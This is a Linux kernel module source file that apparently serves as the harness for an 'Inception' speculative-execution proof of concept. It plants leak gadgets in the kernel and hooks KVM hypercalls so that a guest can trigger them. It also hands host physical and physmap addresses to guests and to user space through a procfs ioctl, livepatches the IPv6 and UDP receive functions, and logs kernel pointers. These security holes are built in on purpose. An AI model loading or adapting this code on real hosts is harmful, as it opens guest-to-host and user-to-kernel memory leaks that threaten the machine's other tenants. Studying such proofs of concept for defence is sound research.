#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kvm_host.h>
#include <linux/kprobes.h>
#include <linux/livepatch.h>
#include <asm/kvm_host.h>
#include <linux/moduleparam.h>
#include <linux/proc_fs.h>

#include "kvm_cache_regs.h"
#include "ioctl.h"

// copied from arch/x86/kvm/kvm_emulate.h
struct x86_exception {
	u8 vector;
	bool error_code_valid;
	u16 error_code;
	bool nested_page_fault;
	u64 address; /* cr2 or nested page fault gpa */
	u8 async_page_fault;
};

volatile char secret[4096];

extern uint64_t gadget_leak_text(void);
extern uint64_t gadget_leak_phys(void);
extern uint64_t gadget_leak_phys2(void);
extern uint64_t gadget_leak_phys_total(void);
extern uint64_t gadget_leak_physmap(void);
extern uint64_t gadget_leak_data(void);
extern uint64_t gadget_leak_data_selftest(void);
extern uint64_t phantom_jump1(void);
extern uint64_t phantom_jump2(void);
extern void trigger_inception(uint64_t arg);

inception_gadget_offsets gadget_offsets = {
    .gadget_leak_text = (uint64_t)gadget_leak_text,
    .gadget_leak_phys = (uint64_t)gadget_leak_phys,
    .gadget_leak_phys2 = (uint64_t)gadget_leak_phys2,
    .gadget_leak_phys_total = (uint64_t)gadget_leak_phys_total,
    .gadget_leak_physmap = (uint64_t)gadget_leak_physmap,
    .gadget_leak_data = (uint64_t)gadget_leak_data,
    .gadget_leak_data_selftest = (uint64_t)gadget_leak_data_selftest,
    .phantom_jump1 = (uint64_t)phantom_jump1,
    .phantom_jump2 = (uint64_t)phantom_jump2,
    .distance_leak_text = 30,
    .distance_leak_phys = 6,
    .distance_leak_phys2 = 4,
    .distance_leak_phys_total = 6,
    .distance_leak_physmap = 0,
    .distance_leak_data = 50,
    .distance_leak_data_selftest = 50,
    .distance_phantom_jump1 = 0,
    .distance_phantom_jump2 = 18,
};

/* PAGE TABLES */
static pte_t *(*lookup_address_in_pgd_module)(pgd_t *pgd, unsigned long address,
				    unsigned int *level);

unsigned long get_physical_address(unsigned long virtual_address) {
    pgd_t *pgd;
    pte_t *pte;
    unsigned int level;
    unsigned long phys_addr;
    struct mm_struct *mm = current->mm;

    pgd = pgd_offset(mm, virtual_address);
    if (pgd_none(*pgd) || pgd_bad(*pgd)) return 0;

    pte = lookup_address_in_pgd_module(pgd, virtual_address, &level);
    if (!pte || !pte_present(*pte)) return 0;

    phys_addr = (phys_addr_t)pte_pfn(*pte) << PAGE_SHIFT;
    phys_addr |= virtual_address & ~page_level_mask(level);
    return phys_addr;
}

/* VMMCALL */
static int vmmcall_trigger_inception(struct kvm_vcpu *vcpu, unsigned long a0) {
    int ret;
    struct x86_exception e;
    char buffer[100];
    gpa_t gpa;

    gpa = kvm_mmu_gva_to_gpa_read(vcpu, a0, &e);
    ret = kvm_vcpu_read_guest(vcpu, gpa, buffer, sizeof(buffer));
    if (ret) {
	printk(KERN_INFO "failed to read from guest\n");
	return ret;
    }

    // flush the buffer (should break the PoC)
    // entry_ibpb();

    trigger_inception(((uint64_t)buffer)-0x18);
    return 0;
}

static int vmmcall_read_gadget_offsets(struct kvm_vcpu *vcpu, unsigned long a0) {
    int ret;
    struct x86_exception e;
    gpa_t gpa;

    gpa = kvm_mmu_gva_to_gpa_read(vcpu, a0, &e);
    ret = kvm_vcpu_write_guest(vcpu, gpa, &gadget_offsets, sizeof(gadget_offsets));
    if (ret < 0) {
        printk(KERN_INFO "failed to write gadget_offsets to guest\n");
        return ret;
    }

    return 0;
}

static int vmmcall_read_phys_addr(struct kvm_vcpu *vcpu, unsigned long a0) {
    int ret;
    struct x86_exception e;
    gpa_t gpa, gpa_buffer;
    uint64_t hva;
    uint64_t hpa;
    uint64_t gva;

    gpa_buffer = kvm_mmu_gva_to_gpa_read(vcpu, a0, &e);
    ret = kvm_vcpu_read_guest(vcpu, gpa_buffer, &gva, sizeof(gva));
    if (ret) {
	printk(KERN_INFO "failed to read from guest\n");
	return ret;
    }
    gpa = kvm_mmu_gva_to_gpa_read(vcpu, gva, &e);
    hva = kvm_vcpu_gfn_to_hva(vcpu, gpa_to_gfn(gpa));
    hpa = get_physical_address(hva);

    ret = kvm_vcpu_write_guest(vcpu, gpa_buffer, &hpa, sizeof(hpa));
    if (ret < 0) {
        printk(KERN_INFO "failed to write hva to guest\n");
        return ret;
    }

    return 0;
}

static int vmmcall_trigger_inception_selftest(struct kvm_vcpu *vcpu, unsigned long a0) {
    uint64_t probe_ptr = a0;
    trigger_inception(probe_ptr);
    return 0;
}

static uint64_t vmmcall_read_reload_buffer_addr(struct kvm_vcpu *vcpu, unsigned long a0) {
    int ret;
    struct x86_exception e;
    gpa_t gpa, gpa_buffer;
    uint64_t hva, hpa, gva;

    /* first read from a0 the gva address of the reload buffer */
    gpa_buffer = kvm_mmu_gva_to_gpa_read(vcpu, a0, &e);
    ret = kvm_vcpu_read_guest(vcpu, gpa_buffer, &gva, sizeof(gva));
    if (ret) {
	printk(KERN_INFO "failed to read from guest\n");
	return ret;
    }
    gpa = kvm_mmu_gva_to_gpa_read(vcpu, gva, &e);
    hva = kvm_vcpu_gfn_to_hva(vcpu, gpa_to_gfn(gpa));
    hpa = get_physical_address(hva);

    // convert it to the physmap address
    hpa += PAGE_OFFSET;

    /* copy it back to the guest */
    ret = kvm_vcpu_write_guest(vcpu, gpa_buffer, &hpa, sizeof(hpa));
    if (ret < 0) {
        printk(KERN_INFO "failed to write hva to guest\n");
        return ret;
    }

    return 0;
}

/* IOCTL */
static struct proc_dir_entry *procfs_file;

static int ioctl_trigger_inception(unsigned long argp) {
    char buffer[100];

    if (copy_from_user(buffer, (uint32_t*)argp, 100)) {
	return -EFAULT;
    }

    // flush the buffer (should break the PoC)
    // entry_ibpb();

    trigger_inception(((uint64_t)buffer)-0x18);

    return 0;
}

static int ioctl_read_gadget_offsets(unsigned long argp) {
    if (copy_to_user((uint32_t*)argp, &gadget_offsets, sizeof(gadget_offsets))){
	return -EFAULT;
    }
    return 0;
}

static int ioctl_read_phys_addr(unsigned long argp) {
    uint64_t hva, hpa;
    if (copy_from_user(&hva, (uint32_t*)argp, sizeof(hva))){
	return -EFAULT;
    }
    hpa = get_physical_address(hva);
    if (copy_to_user((uint32_t*)argp, &hpa, sizeof(hpa))){
	return -EFAULT;
    }
    return 0;
}

static int ioctl_trigger_inception_selftest(unsigned long argp) {
    uint64_t probe_ptr = argp;
    trigger_inception(probe_ptr);
    return 0;
}

static long handle_ioctl(struct file *filp, unsigned int request, unsigned long argp) {
    switch(request) {
	case REQ_TRIGGER_INCEPTION:
	    return ioctl_trigger_inception(argp);
	case REQ_READ_GADGET_OFFSETS:
	    return ioctl_read_gadget_offsets(argp);
	case REQ_READ_PHYS_ADDR:
	    return ioctl_read_phys_addr(argp);
	case REQ_TRIGGER_INCEPTION_SELFTEST:
	    return ioctl_trigger_inception_selftest(argp);
    }
    return 0;
}

static struct proc_ops pops = {
    .proc_ioctl = handle_ioctl,
    .proc_open = nonseekable_open,
    .proc_lseek = no_llseek,
};

static int ioctl_init(void) {
    procfs_file = proc_create(PROC_INCEPTION, 0, NULL, &pops);
    return 0;
}

static void ioctl_exit(void) {
    proc_remove(procfs_file);
}

/* KPROBE */
static unsigned long (*kallsyms_lookup_name_module)(const char *name);
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

int __init lookup_kallsyms_lookup_name(void) {
    register_kprobe(&kp);
    kallsyms_lookup_name_module = (long unsigned int (*)(const char *))kp.addr;
    unregister_kprobe(&kp);
    return 0;
}

static void __kprobes hypercall_probe_handler(struct kprobe *p,
	struct pt_regs *regs,
	unsigned long flags)
{
    unsigned long nr, a0;
    struct kvm_vcpu *vcpu;

    vcpu = (struct kvm_vcpu *)regs_get_kernel_argument(regs, 0);
    nr = kvm_rax_read(vcpu);
    a0 = kvm_rbx_read(vcpu);

    switch (nr) {
	case REQ_TRIGGER_INCEPTION:
	    vmmcall_trigger_inception(vcpu, a0);
	    break;
	case REQ_READ_GADGET_OFFSETS:
	    vmmcall_read_gadget_offsets(vcpu, a0);
	    break;
	case REQ_READ_PHYS_ADDR:
	    vmmcall_read_phys_addr(vcpu, a0);
	    break;
	case REQ_TRIGGER_INCEPTION_SELFTEST:
	    vmmcall_trigger_inception_selftest(vcpu, a0);
	    break;
	case REQ_READ_RELOAD_BUFFER_ADDR:
	    vmmcall_read_reload_buffer_addr(vcpu, a0);
	    break;
    }
}


#define MAX_SYMBOL_LEN 64
static char symbol[] = "kvm_emulate_hypercall";

static struct kprobe hypercall_probe = {
	.symbol_name = symbol,
};

static int __init hypercall_kprobe_helper_init(void)
{
    hypercall_probe.post_handler = hypercall_probe_handler;
    if (register_kprobe(&hypercall_probe) < 0) {
	pr_err("Failed to attach kprobe to %s\n", symbol);
	return -1;
    }

    return 0;
}

static void hypercall_kprobe_helper_exit(void)
{
    unregister_kprobe(&hypercall_probe);
}


/* LIVEPATCH */
extern void ip6_protocol_deliver_rcu_new(struct net *net, struct sk_buff *skb, int nexthdr,
        bool have_final);
extern int udpv6_queue_rcv_one_skb_new(struct sock *sk, struct sk_buff *skb);

uint64_t ip6_protocol_deliver_rcu_module_addr;
uint64_t udpv6_queue_rcv_one_skb_module_addr;

static struct klp_func funcs[] = {
    {
        .old_name = "ip6_protocol_deliver_rcu",
    },
    {
        .old_name = "udpv6_queue_rcv_one_skb",
    },
    { }
};

static struct klp_object objs[] = {
    {
        /* name being NULL means vmlinux */
        .funcs = funcs,
    }, { }
};

static struct klp_patch patch = {
    .mod = THIS_MODULE,
    .objs = objs,
};

static int livepatch_init(void)
{
    ip6_protocol_deliver_rcu_module_addr = (uint64_t)kallsyms_lookup_name_module("ip6_protocol_deliver_rcu");
    ip6_protocol_deliver_rcu_module_addr += 5; /* skip the fentry call (to break the recursion */

    udpv6_queue_rcv_one_skb_module_addr = (uint64_t)kallsyms_lookup_name_module("udpv6_queue_rcv_one_skb");
    udpv6_queue_rcv_one_skb_module_addr += 5; /* skip the fentry call (to break the recursion */

    lookup_address_in_pgd_module = (pte_t *(*)(pgd_t *, unsigned long, unsigned int *))kallsyms_lookup_name_module("lookup_address_in_pgd");

    // update livepatch
    funcs[0].new_func = ip6_protocol_deliver_rcu_new;
    funcs[1].new_func = udpv6_queue_rcv_one_skb_new;

    return klp_enable_patch(&patch);
}

/* VERBOSE */
static void verbose_init(void) {
    printk(KERN_INFO "%llx, %llx, %llx, %llx, %llx, %llx\n",
            *(uint64_t *)gadget_leak_text,
            *(uint64_t *)gadget_leak_phys,
            *(uint64_t *)gadget_leak_phys2,
            *(uint64_t *)gadget_leak_physmap,
            *(uint64_t *)gadget_leak_data,
            *(uint64_t *)gadget_leak_data_selftest
	    );

    printk(KERN_INFO "secret_ptr: %px\n", secret);
    printk(KERN_INFO "page_offset_base: %px\n", (void *)page_offset_base);
    printk(KERN_INFO "PAGE_OFFSET: %px\n", (void *)PAGE_OFFSET);
    printk(KERN_INFO "kallsyms_lookup_name: %px\n", (void *)kallsyms_lookup_name_module);
    printk(KERN_INFO "gadget_offset: %px\n", (void *)((uint64_t)gadget_leak_text & ~0xfff));
    printk(KERN_INFO "gadget_leak_text:    %px\n", (void *)gadget_leak_text);
    printk(KERN_INFO "gadget_leak_text: %px\n", (void *)(((uint64_t)gadget_leak_text & ~0xfff)-((uint64_t)gadget_leak_text & ~0xfff)));
    printk(KERN_INFO "gadget_leak_phys: %px\n", (void *)(((uint64_t)gadget_leak_phys & ~0xfff)-((uint64_t)gadget_leak_text & ~0xfff)));
    printk(KERN_INFO "gadget_leak_phys2: %px\n", (void *)(((uint64_t)gadget_leak_phys2 & ~0xfff)-((uint64_t)gadget_leak_text & ~0xfff)));
    printk(KERN_INFO "gadget_leak_physmap: %px\n", (void *)(((uint64_t)gadget_leak_physmap & ~0xfff)-((uint64_t)gadget_leak_text & ~0xfff)));
    printk(KERN_INFO "gadget_leak_data: %px\n", (void *)(((uint64_t)gadget_leak_data & ~0xfff)-((uint64_t)gadget_leak_text & ~0xfff)));
    printk(KERN_INFO "gadget_leak_data_selftest: %px\n", (void *)(((uint64_t)gadget_leak_data_selftest & ~0xfff)-((uint64_t)gadget_leak_text & ~0xfff)));
    printk(KERN_INFO "phantom_jump1: %px\n", (void *)(((uint64_t)phantom_jump1 & ~0xfff)-((uint64_t)gadget_leak_text & ~0xfff)));
    printk(KERN_INFO "phantom_jump2: %px\n", (void *)(((uint64_t)phantom_jump2 & ~0xfff)-((uint64_t)gadget_leak_text & ~0xfff)));
}

static int __init my_init(void) {
    if (lookup_kallsyms_lookup_name() != 0)
        return -1;
    if (hypercall_kprobe_helper_init() != 0)
	return -1;

    memset((void *)secret, 'A', 4096);
    memset((void *)secret + 1024, 'B', 1024);
    memset((void *)secret + 2048, 'C', 1024);
    memset((void *)secret + 3072, 'D', 1024);

    verbose_init();

    if (livepatch_init() != 0)
        return -1;
    if (ioctl_init() != 0)
        return -1;

    return 0;
}

static void __exit my_exit(void) {
    ioctl_exit();
    hypercall_kprobe_helper_exit();
}

module_init(my_init);
module_exit(my_exit);
MODULE_LICENSE("GPL");
MODULE_INFO(livepatch, "Y");
